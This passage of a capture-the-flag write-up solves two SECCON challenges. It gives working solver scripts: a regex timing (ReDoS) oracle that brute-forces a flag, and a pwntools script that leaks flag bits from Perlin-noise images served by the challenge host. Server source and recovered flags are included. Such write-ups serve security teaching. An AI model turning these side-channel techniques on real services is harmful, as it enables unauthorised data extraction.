 io.recvall(timeout=TIMEOUT)
 t2 = time.time()
 io.close()
 return t2 - t1

def get_rule(index: int, next_chars: str) -> str:
 def escape(s): return s.replace("{", "\\\\{").replace("}", "\\\\}")
 expr = "".join([
 "\\^",
 "[",
 escape(next_chars),
 "]"
 ])
 return f"{index} regex {expr}"

CHARS = "_}" + string.ascii_letters + string.digits

flag = "SECCON{"
while not flag.endswith("}"):
 left = 0
 right = len(CHARS)
 while right - left > 1:
 mid = (left + right)//2
 t_left = get_time(get_rule(len(flag), CHARS[:mid]))
 t_right = get_time(get_rule(len(flag), CHARS[mid:]))
 print(f"{t_left = }, {t_right = }")
 if t_left > t_right:
 right = mid
 else:
 left = mid
 flag += CHARS[left]
 print(flag)
print(f"{flag = }")
```



```
1
```



```
SECCON{reDo5L1fe}
```



```
1
```



```
nc noiseccon.seccon.games 1337
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
```



```
$ nc noiseccon.seccon.games 1337
 _ _ _ ____ _
 | \ | | ___ (_)___ ___ / ___| ___ _ __ ___ _ __ __ _| |_ ___ _ __
 | \| |/ _ \| / __|/ _ \ | | _ / _ \ '_ \ / _ \ '__/ _` | __/ _ \| '__|
 | |\ | (_) | \__ \ __/ | |_| | __/ | | | __/ | | (_| | || (_) | |
 |_| \_|\___/|_|___/\___| \____|\___|_| |_|\___|_| \__,_|\__\___/|_|

Flag length: 21
Image width: 256
Image height: 256
Scale x: 1
Scale y: 2
UklGRoo7AABXRUJQVlA4TH07AAAv/8A/AM0ABDHgf9pA... snip (base64 of an image data) ...5SImJZRsMGAA==
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
```



```
const { noise } = require("./perlin.js");
const sharp = require("sharp");
const crypto = require("node:crypto");
const readline = require("node:readline").promises;

const FLAG = process.env.FLAG ?? console.log("No flag") ?? process.exit(1);
const WIDTH = 256;
const HEIGHT = 256;

console.log(
 ` _ _ _ ____ _
 | \\ | | ___ (_)___ ___ / ___| ___ _ __ ___ _ __ __ _| |_ ___ _ __
 | \\| |/ _ \\| / __|/ _ \\ | | _ / _ \\ '_ \\ / _ \\ '__/ _\` | __/ _ \\| '__|
 | |\\ | (_) | \\__ \\ __/ | |_| | __/ | | | __/ | | (_| | || (_) | |
 |_| \\_|\\___/|_|___/\\___| \\____|\\___|_| |_|\\___|_| \\__,_|\\__\\___/|_|
 `
);

console.log(`Flag length: ${FLAG.length}`);
console.log(`Image width: ${WIDTH}`);
console.log(`Image height: ${HEIGHT}`);

const paddedFlag = [
 ...crypto.randomBytes(8), // random prefix
 ...Buffer.from(FLAG),
 ...crypto.randomBytes(8), // random suffix
];

// bytes_to_long
let flagInt = 0n;
for (const b of Buffer.from(paddedFlag)) {
 flagInt = (flagInt << 8n) | BigInt(b);
}

const generateNoise = async (scaleX, scaleY) => {
 const div = (x, y) => {
 const p = 4;
 return Number(BigInt.asUintN(32 + p, (x * BigInt(1 << p)) / y)) / (1 << p);
 };

 const offsetX = div(flagInt, scaleX);
 const offsetY = div(flagInt, scaleY);

 noise.seed(crypto.randomInt(65536));
 const colors = [];
 for (let y = 0; y < HEIGHT; y++) {
 for (let x = 0; x < WIDTH; x++) {
 let v = noise.perlin2(offsetX + x * 0.05, offsetY + y * 0.05);
 v = (v + 1.0) * 0.5; // [-1, 1] -> [0, 1]
 colors.push((v * 256) | 0);
 }
 }

 const image = await sharp(Uint8Array.from(colors), {
 raw: {
 width: WIDTH,
 height: HEIGHT,
 channels: 1,
 },
 })
 .webp({ lossless: true })
 .toBuffer();
 return image;
};

const main = async () => {
 const rl = readline.createInterface({
 input: process.stdin,
 output: process.stdout,
 terminal: false,
 });

 const toBigInt = (value) => {
 if (value.length > 100) {
 console.log(`Invalid value: ${value}`);
 process.exit(1);
 }
 const result = BigInt(value);
 if (result <= 0n) {
 console.log(`Invalid value: ${value}`);
 process.exit(1);
 }
 return result;
 };

 const query = async () => {
 const scaleX = toBigInt(await rl.question("Scale x: "));
 const scaleY = toBigInt(await rl.question("Scale y: "));

 const image = await generateNoise(scaleX, scaleY);
 console.log(image.toString("base64"));
 };
 await query();

 rl.close();
};

main();
```



```
1
2
3
4
5
6
7
8
9
10
11
12
```



```
const offsetX = div(flagInt, scaleX);
const offsetY = div(flagInt, scaleY);

noise.seed(crypto.randomInt(65536));
const colors = [];
for (let y = 0; y < HEIGHT; y++) {
 for (let x = 0; x < WIDTH; x++) {
 let v = noise.perlin2(offsetX + x * 0.05, offsetY + y * 0.05);
 v = (v + 1.0) * 0.5; // [-1, 1] -> [0, 1]
 colors.push((v * 256) | 0);
 }
}
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
```



```
// From: https://github.com/josephg/noisejs/blob/master/perlin.js#L250-L273

 // 2D Perlin Noise
 module.perlin2 = function(x, y) {
 // Find unit grid cell containing point
 var X = Math.floor(x), Y = Math.floor(y);
 // Get relative xy coordinates of point within that cell
 x = x - X; y = y - Y;
 // Wrap the integer cells at 255 (smaller integer period can be introduced here)
 X = X & 255; Y = Y & 255;

 // Calculate noise contributions from each of the four corners
 var n00 = gradP[X+perm[Y]].dot2(x, y);
 var n01 = gradP[X+perm[Y+1]].dot2(x, y-1);
 var n10 = gradP[X+1+perm[Y]].dot2(x-1, y);
 var n11 = gradP[X+1+perm[Y+1]].dot2(x-1, y-1);

 // Compute the fade curve value for x
 var u = fade(x);

 // Interpolate the four results
 return lerp(
 lerp(n00, n10, u),
 lerp(n01, n11, u),
 fade(y));
 };
```



```
1
2
3
```



```
var grad3 = [new Grad(1,1,0),new Grad(-1,1,0),new Grad(1,-1,0),new Grad(-1,-1,0),
 new Grad(1,0,1),new Grad(-1,0,1),new Grad(1,0,-1),new Grad(-1,0,-1),
 new Grad(0,1,1),new Grad(0,-1,1),new Grad(0,1,-1),new Grad(0,-1,-1)];
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
```



```
const { noise } = require("./perlin.js");
const nodeplotlib = require("nodeplotlib");
const crypto = require("node:crypto");

noise.seed(crypto.randomInt(65536));
console.log(noise);

const values = [];

const y0 = 0;
for (let i = 0; i < 1000; i++) {
 const x = i * 0.01;
 const v = noise.perlin2(x, y0);
 values.push(v);
}

const data = [
 {
 x: [...values.keys()],
 y: values,
 type: "scatter",
 },
];
nodeplotlib.plot(data);
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
```



```
const div = (x, y) => {
 const p = 4;
 return Number(BigInt.asUintN(32 + p, (x * BigInt(1 << p)) / y)) / (1 << p);
};

const offsetX = div(flagInt, scaleX);
const offsetY = div(flagInt, scaleY);

noise.seed(crypto.randomInt(65536));
const colors = [];
for (let y = 0; y < HEIGHT; y++) {
 for (let x = 0; x < WIDTH; x++) {
 let v = noise.perlin2(offsetX + x * 0.05, offsetY + y * 0.05);
 v = (v + 1.0) * 0.5; // [-1, 1] -> [0, 1]
 colors.push((v * 256) | 0);
 }
}
```



```
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
```



```
from concurrent.futures import ThreadPoolExecutor
from Crypto.Util.number import long_to_bytes, bytes_to_long
from PIL import Image
import pwn
from io import BytesIO
import base64
import os

LATTICE_SIZE = 20 # = 1 / 0.05

with pwn.remote(os.getenv('SECCON_HOST'), os.getenv('SECCON_PORT')) as io:
 io.recvuntil(b"Flag length: ")
 flag_bit_len = int(io.recvline().decode())*8
 io.recvuntil(b"Image width: ")
 width = int(io.recvline().decode())
 io.recvuntil(b"Image height: ")
 height = int(io.recvline().decode())

def get_image(scale_x, scale_y) -> Image:
 io = pwn.remote(os.getenv('SECCON_HOST'), os.getenv('SECCON_PORT'))
 io.sendlineafter(b"Scale x: ", str(scale_x).encode())
 io.sendlineafter(b"Scale y: ", str(scale_y).encode())
 binary = base64.b64decode(io.recvline().strip().decode())
 io.close()
 return Image.open(BytesIO(binary), formats=["webp"])

def oracle(bit_index: int) -> bool:
 scale_x = 2**(bit_index + 1)
 scale_y = 1

 for _ in range(10):
 img = get_image(scale_x, scale_y)
 # img.save("output.webp")
 data = list(img.getdata())
 assert len(data) == width*height

 for y in range(0, height, LATTICE_SIZE):
 cnt = 0
 for x in range(width):
 color = data[y*width + x][0]
 if abs(color - 128) == 0:
 cnt += 1
 else:
 if 0 <= cnt - LATTICE_SIZE < 2:
 i = (x - cnt - 2) % LATTICE_SIZE
 return i < LATTICE_SIZE/2
 cnt = 0
 print("Failed")
 exit(1)

padded_bit_len = 8*8

flag = 0
with ThreadPoolExecutor(max_workers=8) as executor:
 bits = executor.map(oracle, range(padded_bit_len, padded_bit_len + flag_bit_len))
for index, bit in enumerate(bits):
 flag |= bit << index

print(long_to_bytes(flag))
```



```
1
```



```
SECCON{p3RLin_W0r1d!}
```
